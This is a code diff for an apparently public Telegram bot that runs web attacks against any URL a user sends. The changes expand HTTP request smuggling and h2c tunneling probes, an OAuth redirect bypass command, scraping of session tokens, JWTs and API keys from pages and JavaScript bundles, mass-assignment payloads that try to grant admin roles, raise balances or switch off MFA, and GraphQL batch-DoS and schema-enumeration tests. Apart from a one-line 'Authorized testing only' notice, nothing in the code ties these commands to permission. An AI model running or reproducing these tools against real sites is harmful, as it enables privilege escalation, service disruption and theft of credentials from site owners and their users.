@@ -20838,7 +21088,7 @@ async def cmd_smuggling_tester(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.effective_message.reply_text(f"❌ *Blocked:* {reason}", parse_mode='Markdown'); return
     _active_scans.set(uid, "Smuggling Test")
     msg = await update.effective_message.reply_text(
-        f"🚀 *Smuggling Test   `{urlparse(url).netloc}`*\n\n⏳ Testing CL.TE / TE.CL timing...", parse_mode='Markdown')
+        f"🚀 *Smuggling Test — `{urlparse(url).netloc}`*\n\n⏳ Testing CL.TE / TE.CL timing...", parse_mode='Markdown')
     findings = []
     tests = [
         {"name": "CL.TE", "headers": {"Content-Length": "4", "Transfer-Encoding": "chunked"},
@@ -20858,7 +21108,7 @@ async def cmd_smuggling_tester(update: Update, context: ContextTypes.DEFAULT_TYP
                             elapsed = time.monotonic() - start
                             if proxy_entry: await _PROXY_MANAGER.mark_success(proxy_entry)
                             if elapsed > 6:
-                                findings.append(f"⚠️ *{t['name']} Detected:* Delay `{elapsed:.1f}s`   {t['desc']}")
+                                findings.append(f"⚠️ *{t['name']} Detected:* Delay `{elapsed:.1f}s` — {t['desc']}")
                             elif r.status == 400:
                                 findings.append(f"ℹ️ *{t['name']} Rejected:* 400 (WAF protected)")
                             break
@@ -20877,14 +21127,14 @@ async def cmd_smuggling_tester(update: Update, context: ContextTypes.DEFAULT_TYP
 
 
 async def cmd_h2c_smuggling(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/h2c_smuggling <url> - HTTP/2 Cleartext (h2c) Tunneling Detection"""
+    """/h2c_smuggling <url> — HTTP/2 Cleartext (h2c) Tunneling Detection"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
     if not allowed:
         await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown'); return
     if uid in _active_scans:
-        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running   `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
+        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running — `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
     if not context.args:
         await update.effective_message.reply_text("📌 *Usage:* `/h2c_smuggling https://example.com`", parse_mode='Markdown'); return
     url = context.args[0].strip()
@@ -20893,7 +21143,7 @@ async def cmd_h2c_smuggling(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"❌ *Blocked:* {reason}", parse_mode='Markdown'); return
     _active_scans.set(uid, "h2c Smuggling")
     msg = await update.effective_message.reply_text(
-        f"🚀 *h2c Smuggling   `{urlparse(url).netloc}`*\n\n⏳ Testing Protocol Upgrade...", parse_mode='Markdown')
+        f"🚀 *h2c Smuggling — `{urlparse(url).netloc}`*\n\n⏳ Testing Protocol Upgrade...", parse_mode='Markdown')
     h2c_headers = {"Upgrade": "h2c", "Connection": "Upgrade, HTTP2-Settings", "HTTP2-Settings": "AAMAAABkAAQAAP__"}
     try:
         for attempt in range(1, 4):
@@ -20908,7 +21158,7 @@ async def cmd_h2c_smuggling(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         elif "h2c" in r.headers.get("Upgrade", "").lower():
                             await msg.edit_text(f"🟠 *POTENTIAL:* h2c in Upgrade header, status `{r.status}`.", parse_mode='Markdown')
                         else:
-                            await msg.edit_text(f"✅ *Not Vulnerable:* `{r.status}`   h2c upgrade ignored.", parse_mode='Markdown')
+                            await msg.edit_text(f"✅ *Not Vulnerable:* `{r.status}` — h2c upgrade ignored.", parse_mode='Markdown')
                         return
             except Exception:
                 if proxy_entry: await _PROXY_MANAGER.mark_fail(proxy_entry)
@@ -20918,7 +21168,7 @@ async def cmd_h2c_smuggling(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def cmd_oauth_steal(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/oauth_steal <url> - OAuth2 Redirect URI Bypass Tester"""
+    """/oauth_steal <url> — OAuth2 Redirect URI Bypass Tester"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -20962,14 +21212,14 @@ async def cmd_oauth_steal(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def cmd_idor_uuid_leak(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/idor_uuid_leak <url> - UUID & Resource ID Miner"""
+    """/idor_uuid_leak <url> — UUID & Resource ID Miner"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
     if not allowed:
         await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown'); return
     if uid in _active_scans:
-        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running   `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
+        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running — `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
     if not context.args:
         await update.effective_message.reply_text("📌 *Usage:* `/idor_uuid_leak https://example.com`", parse_mode='Markdown'); return
     url = context.args[0].strip()
@@ -20984,22 +21234,42 @@ async def cmd_idor_uuid_leak(update: Update, context: ContextTypes.DEFAULT_TYPE)
             async with session.get(url, headers=_get_headers(), ssl=False) as r:
                 headers_str = str(r.headers)
         patterns = {
-            "UUID v4":    r'[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
-            "Firebase":   r'-[A-Za-z0-9_-]{19}',
-            "Generic ID": r'["\x27](?>user|account|order|id|uid|uuid)["\x27]\s*[:=]\s*["\x27]([a-zA-Z0-9_-]{16,64})["\x27]',
-            "MongoDB":    r'[0-9a-f]{24}',
+            "UUID v4":        r'[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
+            "UUID v1":        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
+            "UUID v5":        r'[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
+            "Firebase ID":    r'-[A-Za-z0-9_-]{19}',
+            "MongoDB ObjID":  r'\b[0-9a-f]{24}\b',
+            "Generic ID":     r'["\x27"](user|account|order|id|uid|uuid)["\x27"]\s*[:=]\s*["\x27"]([a-zA-Z0-9_-]{16,64})["\x27"]',
+            "Numeric ID":     r'(?:user_id|account_id|order_id|item_id|product_id|customer_id)\s*[:=]\s*(\d{4,12})',
+            "Snowflake ID":   r'\b[0-9]{17,20}\b',
+            "AWS Resource":   r'arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:\d{12}:[^\\s"\x27]<>]{3,100}',
+            "JWT Payload":    r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
+            "Session Token":  r'(?:session|sess)[_-]?(?:id|token)\s*[:=]\s*["\x27"]?([a-zA-Z0-9_\-]{20,80})',
+            "API Key Leak":   r'(?:api[_-]?key|token)\s*[:=]\s*["\x27"]([a-zA-Z0-9_\-]{20,64})["\x27"]',
+            "ULID":           r'\b[0-9A-Z]{26}\b',
+            "NanoID":         r'\b[A-Za-z0-9_\-]{21}\b',
         }
         found_all = {}
         for name, pat in patterns.items():
             matches = set(re.findall(pat, text + headers_str, re.I))
-            if matches: found_all[name] = matches
+            # Flatten tuples from groups
+            flat = set()
+            for m in matches:
+                flat.add(m[-1] if isinstance(m, tuple) else m)
+            if flat:
+                found_all[name] = flat
         if found_all:
-            res = ["📄 *Extracted Resource IDs:*"]
+            res = [f"📄 *Extracted Resource IDs — `{urlparse(url).hostname}`*\n"]
+            total_count = sum(len(v) for v in found_all.values())
+            res.append(f"🔢 Total unique IDs: `{total_count}`\n")
             for name, matches in found_all.items():
-                res.append(f"\n🔹 *{name}* ({len(matches)}):")
-                for m in list(matches)[:5]:
-                    res.append(f"  • `{str(m)[:60]}`")
-            res.append("\n💡 Test IDs in `/api/user/<ID>` for IDOR bypass.")
+                res.append(f"\n🔹 *{name}* ({len(matches)} found):")
+                for m in sorted(matches)[:15]:
+                    res.append(f"  • `{str(m)[:80]}`")
+                if len(matches) > 15:
+                    res.append(f"  _...and {len(matches)-15} more_")
+            res.append(f"\n💡 *IDOR Test:* Try IDs in `/api/user/<ID>`, `/api/order/<ID>`, `/api/account/<ID>` for authorization bypass.")
+            res.append("⚠️ _Authorized testing only._")
             await msg.edit_text("\n".join(res), parse_mode='Markdown')
         else:
             await msg.edit_text("✅ *No resource IDs found.*", parse_mode='Markdown')
@@ -21010,7 +21280,7 @@ async def cmd_idor_uuid_leak(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 
 async def cmd_api_mass_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/api_mass_assign <url> - API Mass Assignment & Overposting Tester"""
+    """/api_mass_assign <url> — API Mass Assignment & Overposting Tester"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -21024,34 +21294,84 @@ async def cmd_api_mass_assign(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.effective_message.reply_text(f"❌ *Blocked:* {reason}", parse_mode='Markdown'); return
     msg = await update.effective_message.reply_text("🚀 *Mass Assignment Test*\n\n⏳ Injecting admin attributes...", parse_mode='Markdown')
     payloads = [
-        {"role": "admin", "isAdmin": True, "is_admin": 1, "group": "superusers"},
-        {"permissions": ["*"], "privileges": "all", "access_level": 99},
-        {"account_type": "premium", "verified": True, "balance": 999999},
+        # Role escalation
+        {"role": "admin", "isAdmin": True, "is_admin": 1, "group": "superusers", "admin": True},
+        {"role": "superadmin", "isOwner": True, "isSuperAdmin": True, "is_superadmin": 1},
+        {"role": "root", "is_root": True, "is_staff": True, "is_superuser": True},
+        # Permission escalation
+        {"permissions": ["*"], "privileges": "all", "access_level": 99, "scope": "admin"},
+        {"permissions": ["read", "write", "delete", "admin"], "can_delete": True, "can_manage": True},
+        {"access": "full", "level": "superadmin", "tier": "enterprise", "plan": "unlimited"},
+        # Financial escalation
+        {"account_type": "premium", "verified": True, "balance": 999999, "credits": 999999},
+        {"subscription": "enterprise", "trial": False, "paid": True, "quota": -1},
+        {"wallet": {"balance": 99999}, "points": 999999, "coins": 999999},
+        # Status / verification bypass
+        {"email_verified": True, "phone_verified": True, "kyc_status": "approved", "identity_verified": True},
+        {"banned": False, "active": True, "status": "active", "enabled": True, "locked": False},
+        {"two_factor_enabled": False, "mfa_required": False, "require_password_change": False},
+        # Internal field injection
+        {"__proto__": {"isAdmin": True}, "constructor": {"prototype": {"isAdmin": True}}},
+        {"_isAdmin": True, "_role": "admin", "__admin": True, "internal_role": "ADMIN"},
     ]
     findings = []
     try:
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
-            for p in payloads:
-                for method_fn, method_name in [(session.put, "PUT"), (session.patch, "PATCH")]:
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
+            for p_idx, p in enumerate(payloads):
+                for method_fn, method_name in [(session.put, "PUT"), (session.patch, "PATCH"), (session.post, "POST")]:
                     try:
-                        async with method_fn(url, json=p, headers=_get_headers(), ssl=False) as r:
+                        async with method_fn(url, json=p, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r:
                             if r.status in (200, 201, 204):
-                                res_body = await r.text()
-                                reflected = [k for k in p.keys() if f'"{k}"' in res_body]
+                                try:
+                                    res_body = await r.text()
+                                except Exception:
+                                    res_body = ""
+                                # Check reflected keys
+                                reflected = [k for k in p.keys() if f'"{k}"' in res_body or f"'{k}'" in res_body]
+                                # Check value changes
+                                value_confirmed = []
+                                for k, v in p.items():
+                                    if isinstance(v, (bool, int, str)) and str(v).lower() in res_body.lower():
+                                        value_confirmed.append(f"{k}={v}")
                                 if reflected:
-                                    findings.append(f"🔴 *VULNERABLE ({method_name}):* Reflected: `{reflected}`")
+                                    findings.append(
+                                        f"🔴 *VULNERABLE ({method_name} payload #{p_idx+1}):*\n"
+                                        f"   Reflected keys: `{reflected[:5]}`\n"
+                                        f"   Confirmed: `{value_confirmed[:3]}`"
+                                    )
+                                elif r.status in (200, 201) and res_body and len(res_body) > 5:
+                                    # Heuristic: any successful mutation
+                                    findings.append(
+                                        f"🟠 *POSSIBLE ({method_name} payload #{p_idx+1}):*\n"
+                                        f"   Status `{r.status}` accepted — manual verify needed"
+                                    )
                     except Exception:
                         pass
     except Exception as e:
         await msg.edit_text(f"❌ *Failed:* `{str(e)[:100]}`", parse_mode='Markdown'); return
     if findings:
-        await msg.edit_text("🔥 *Mass Assignment Findings:*\n\n" + "\n".join(findings), parse_mode='Markdown')
+        result_lines = [
+            f"🔥 *Mass Assignment Findings — `{urlparse(url).hostname}`*\n",
+            f"Total: `{len(findings)}` issues found\n"
+        ]
+        result_lines.extend(findings[:10])
+        if len(findings) > 10:
+            result_lines.append(f"\n_...and {len(findings)-10} more_")
+        result_lines.append("\n💡 _These fields may allow privilege escalation or unauthorized attribute modification._")
+        result_lines.append("⚠️ _Authorized testing only._")
+        await msg.edit_text("\n".join(result_lines), parse_mode='Markdown')
     else:
-        await msg.edit_text("✅ *No Mass Assignment detected.*", parse_mode='Markdown')
+        await msg.edit_text(
+            f"✅ *No Mass Assignment Vulnerability Detected*\n\n"
+            f"🌐 `{url[:80]}`\n"
+            f"🧪 Payloads tested: `{len(payloads)}`\n"
+            f"🔧 Methods: PUT, PATCH, POST",
+            parse_mode='Markdown'
+        )
 
 
 async def cmd_graphql_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/graphql_batch <url> - GraphQL Batching & DoS Tester"""
+    """/graphql_batch <url> — GraphQL Batching & DoS Tester"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -21063,32 +21383,81 @@ async def cmd_graphql_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
     safe, reason = is_safe_url(url)
     if not safe:
         await update.effective_message.reply_text(f"❌ *Blocked:* {reason}", parse_mode='Markdown'); return
-    msg = await update.effective_message.reply_text("🚀 *GraphQL Batching Test*\n\n⏳ Sending 100 queries...", parse_mode='Markdown')
+    msg = await update.effective_message.reply_text("🚀 *GraphQL Batching Test*\n\n⏳ Sending 100 queries + introspection...", parse_mode='Markdown')
     batch_query = [{"query": "query { __typename }"} for _ in range(100)]
+    findings = []
     try:
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
-            async with session.post(url, json=batch_query, headers=_get_headers(), ssl=False) as r:
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20)) as session:
+            # Test 1: Batch DoS
+            async with session.post(url, json=batch_query, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r:
                 if r.status == 200:
-                    data = await r.json(content_type=None)
-                    if isinstance(data, list) and len(data) == 100:
-                        await msg.edit_text(
-                            "🔴 *VULNERABLE:* 100 batched queries processed.\n\n💡 Rate-limit bypass / DoS possible.",
-                            parse_mode='Markdown')
-                        return
-                await msg.edit_text(f"✅ *Not Vulnerable:* Server returned `{r.status}`.", parse_mode='Markdown')
+                    try:
+                        data = await r.json(content_type=None)
+                        if isinstance(data, list) and len(data) >= 50:
+                            findings.append(f"🔴 *Batch DoS:* `{len(data)}` queries processed in one request\n   💡 Rate-limit bypass / CPU exhaustion possible")
+                    except Exception:
+                        pass
+
+            # Test 2: Introspection (information disclosure)
+            introspect = {"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
+            async with session.post(url, json=introspect, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r2:
+                if r2.status == 200:
+                    try:
+                        idata = await r2.json(content_type=None)
+                        if idata.get("data", {}).get("__schema"):
+                            types = idata["data"]["__schema"].get("types", [])
+                            user_types = [t["name"] for t in types if not t["name"].startswith("__")][:20]
+                            findings.append(f"🔴 *Introspection ENABLED:* `{len(user_types)}` types exposed\n   Types: `{'`, `'.join(user_types[:8])}`\n   💡 Full schema enumeration possible")
+                    except Exception:
+                        pass
+
+            # Test 3: Deep query (alias amplification)
+            deep_query = {"query": "{ " + " ".join([f"q{i}: __typename" for i in range(50)]) + " }"}
+            async with session.post(url, json=deep_query, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r3:
+                if r3.status == 200:
+                    try:
+                        ddata = await r3.json(content_type=None)
+                        if ddata.get("data") and len(ddata["data"]) >= 40:
+                            findings.append(f"🟠 *Alias Amplification:* `{len(ddata['data'])}` aliases returned\n   💡 Response amplification possible")
+                    except Exception:
+                        pass
+
+            # Test 4: Field suggestion (engine leak)
+            typo_query = {"query": "{ usr { id } }"}
+            async with session.post(url, json=typo_query, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r4:
+                if r4.status == 200:
+                    try:
+                        body4 = await r4.text()
+                        if "Did you mean" in body4 or "suggestion" in body4.lower():
+                            findings.append("🟡 *Field Suggestion Leak:* Engine reveals valid field names via error messages")
+                    except Exception:
+                        pass
+
+        if findings:
+            result = [f"🔥 *GraphQL Vulnerabilities — `{urlparse(url).hostname}`*\n"]
+            result.extend(findings)
+            result.append("\n⚠️ _Authorized testing only._")
+            await msg.edit_text("\n\n".join(result), parse_mode='Markdown')
+        else:
+            await msg.edit_text(
+                f"✅ *GraphQL: No Critical Issues Found*\n\n"
+                f"🌐 `{url[:60]}`\n"
+                f"🔒 Batching, introspection, alias amp — all tested",
+                parse_mode='Markdown'
+            )
     except Exception as e:
         await msg.edit_text(f"❌ *Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
 
 
 async def cmd_js_restore(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/js_restore <url> - JS Bundle Secret Mining"""
+    """/js_restore <url> — JS Bundle Secret Mining"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
     if not allowed:
         await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown'); return
     if uid in _active_scans:
-        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running   `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
+        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running — `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
     if not context.args:
         await update.effective_message.reply_text("📌 *Usage:* `/js_restore https://site.com/main.bundle.js`", parse_mode='Markdown'); return
     url = context.args[0].strip()
@@ -21098,19 +21467,103 @@ async def cmd_js_restore(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _active_scans.set(uid, "JS Restore")
     msg = await update.effective_message.reply_text("🚀 *JS Secret Mining*\n\n⏳ Analyzing bundle...", parse_mode='Markdown')
     try:
-        js_content = await get_rendered_html(url)
+        # ── Phase 1: Fetch the target (HTML or direct JS) ──────────
+        main_content = await get_rendered_html(url)
+        all_js_sources = {"[target]": main_content}
+
+        # ── Phase 2: If HTML, discover & download all JS bundles ──
+        if url.endswith('.html') or '<html' in main_content[:500].lower() or '<!doctype' in main_content[:200].lower():
+            await msg.edit_text("🚀 *JS Secret Mining*\n\n🔍 HTML detected — discovering JS bundles...", parse_mode='Markdown')
+            soup_js = BeautifulSoup(main_content, 'html.parser')
+            root_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+            js_urls_found = []
+            for tag in soup_js.find_all('script', src=True):
+                src = tag.get('src', '')
+                if not src: continue
+                if src.startswith('//'):   src = 'https:' + src
+                elif src.startswith('/'): src = root_url + src
+                if src.startswith('http'): js_urls_found.append(src)
+            # Also check for inline scripts
+            inline_idx = 0
+            for tag in soup_js.find_all('script', src=False):
+                if tag.string and len(tag.string.strip()) > 50:
+                    all_js_sources[f"[inline_{inline_idx}]"] = tag.string
+                    inline_idx += 1
+
+            # Download external JS files (up to 20)
+            def _fetch_js(js_url):
+                try:
+                    r = requests.get(js_url, headers=_get_headers(), timeout=12, verify=False)
+                    if r.status_code == 200 and len(r.text) > 50:
+                        return js_url, r.text
+                except Exception:
+                    pass
+                return js_url, None
+
+            if js_urls_found:
+                await msg.edit_text(
+                    f"🚀 *JS Secret Mining*\n\n"
+                    f"📦 Found `{len(js_urls_found)}` JS bundles\n"
+                    f"⬇️ Downloading & analyzing...",
+                    parse_mode='Markdown'
+                )
+                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+                    futs = {ex.submit(_fetch_js, u): u for u in js_urls_found[:20]}
+                    for fut in concurrent.futures.as_completed(futs, timeout=45):
+                        try:
+                            js_url_k, js_content_v = fut.result(timeout=8)
+                            if js_content_v:
+                                fname = js_url_k.split('/')[-1][:40] or js_url_k[-30:]
+                                all_js_sources[fname] = js_content_v
+                        except Exception:
+                            pass
+
+        # ── Phase 3: Scan ALL collected sources for secrets ────────
         secrets = []
-        for pat, label in _ANALYZE_SECRET_PATTERNS:
-            for m in set(re.findall(pat, js_content)):
-                masked = (m[:6] + "···" + m[-4:] if len(m) > 10 else m).replace("`", "'")
-                secrets.append(f"{label}: `{masked}`")
-        if secrets:
-            report = "🔥 *Secrets Found:*\n\n" + "\n".join(list(set(secrets))[:25])
-            if len(secrets) > 25:
-                report += f"\n\n_...and {len(secrets)-25} more_"
-            await msg.edit_text(report, parse_mode='Markdown')
+        source_hits = {}
+        for src_name, src_content in all_js_sources.items():
+            src_secrets = []
+            for pat, label in _ANALYZE_SECRET_PATTERNS:
+                for m in set(re.findall(pat, src_content)):
+                    val = m[-1] if isinstance(m, tuple) else m
+                    if len(val) < 6: continue
+                    masked = (val[:8] + "···" + val[-4:] if len(val) > 12 else val).replace("`", "'")
+                    entry = f"{label}: `{masked}`"
+                    src_secrets.append(entry)
+                    secrets.append(entry)
+            if src_secrets:
+                source_hits[src_name] = list(set(src_secrets))
+
+        unique_secrets = list(dict.fromkeys(secrets))  # preserve order, deduplicate
+        if unique_secrets:
+            report_lines = [
+                f"🔥 *JS Secret Mining Results*\n",
+                f"🌐 Target: `{url[:60]}`",
+                f"📦 Sources scanned: `{len(all_js_sources)}`",
+                f"🔑 Total secrets found: `{len(unique_secrets)}`\n",
+            ]
+            # Per-source breakdown
+            if len(source_hits) > 1:
+                report_lines.append("*📂 By Source:*")
+                for src_n, src_s in list(source_hits.items())[:10]:
+                    short_name = src_n[:35] if len(src_n) > 35 else src_n
+                    report_lines.append(f"  `{short_name}` — `{len(src_s)}` secrets")
+                report_lines.append("")
+            report_lines.append("*🔑 All Secrets:*")
+            for s in unique_secrets[:80]:
+                report_lines.append(f"  • {s}")
+            if len(unique_secrets) > 80:
+                report_lines.append(f"\n_...and {len(unique_secrets)-80} more_")
+            report_lines.append("\n⚠️ _Authorized testing only._")
+            await msg.edit_text("\n".join(report_lines), parse_mode='Markdown')
         else:
-            await msg.edit_text("✅ *No secrets found.*", parse_mode='Markdown')
+            await msg.edit_text(
+                f"✅ *No Secrets Found*\n\n"
+                f"🌐 `{url[:60]}`\n"
+                f"📦 Sources scanned: `{len(all_js_sources)}`\n"
+                f"🔍 Patterns checked: `{len(_ANALYZE_SECRET_PATTERNS)}`",
+                parse_mode='Markdown'
+            )
     except Exception as e:
         await msg.edit_text(f"❌ *Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
     finally:
